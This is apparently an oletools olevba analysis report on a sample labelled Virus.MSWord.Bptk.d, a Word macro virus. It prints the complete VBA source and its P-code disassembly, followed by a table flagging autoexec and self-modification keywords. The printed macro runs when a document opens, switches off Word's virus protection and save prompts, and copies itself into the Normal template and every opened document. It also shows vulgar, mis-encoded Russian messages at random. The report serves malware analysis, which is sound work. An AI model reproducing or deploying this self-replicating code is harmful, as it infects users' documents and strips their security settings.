olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'D
'
'
On Error Resume Next
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If N.Lines(4, 1) <> "'" Then
N.DeleteLines 1, N.CountOfLines
N.AddFromstring A.Lines(1, A.CountOfLines)
NormalTemplate.Save
GoTo 30
ElseIf A.Lines(4, 1) <> "'" Then
A.DeleteLines 1, A.CountOfLines
A.AddFromstring N.Lines(1, N.CountOfLines)
ActiveDocument.Save
End If
Randomize
If Rnd < 0.2 Then
MsgBox "ß å..ëñÿ ñ ýòîé êíîïêîé,"
MsgBox "Òû å..èñü ïîíàæèìàé !"
GoTo 20
End If
If Rnd < 0.1 Then
MsgBox "Êàê ÿ ¸..ñÿ ñ ýòîé êíîïêîé,"
MsgBox "Ïîå..èñü òåïåðü è òû !"
End If
20 If Rnd < 0.1 Then MsgBox "John  ÁÃÒÓ  Áðÿíñê 2001 ã. (â îòâåò ÁÏÒÊàì)": GoTo 30
30 End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bptk.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2677 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x0001 "D"
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #7:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #8:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #9:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #10:
' 	EndWith 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set N 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set A 
' Line #13:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld N 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld N 
' 	MemLd CountOfLines 
' 	Ld N 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd CountOfLines 
' 	Ld A 
' 	ArgsMemLd Lines 0x0002 
' 	Ld N 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #16:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #17:
' 	GoTo 30 
' Line #18:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld A 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	ElseIfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd CountOfLines 
' 	Ld A 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld N 
' 	MemLd CountOfLines 
' 	Ld N 
' 	ArgsMemLd Lines 0x0002 
' 	Ld A 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Lt 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0018 "ß å..ëñÿ ñ ýòîé êíîïêîé,"
' 	ArgsCall MsgBox 0x0001 
' Line #26:
' 	LitStr 0x0015 "Òû å..èñü ïîíàæèìàé !"
' 	ArgsCall MsgBox 0x0001 
' Line #27:
' 	GoTo 20 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	IfBlock 
' Line #30:
' 	LitStr 0x001B "Êàê ÿ ¸..ñÿ ñ ýòîé êíîïêîé,"
' 	ArgsCall MsgBox 0x0001 
' Line #31:
' 	LitStr 0x0016 "Ïîå..èñü òåïåðü è òû !"
' 	ArgsCall MsgBox 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LineNum 20 
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002B "John  ÁÃÒÓ  Áðÿíñê 2001 ã. (â îòâåò ÁÏÒÊàì)"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo 30 
' 	EndIf 
' Line #34:
' 	LineNum 30 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

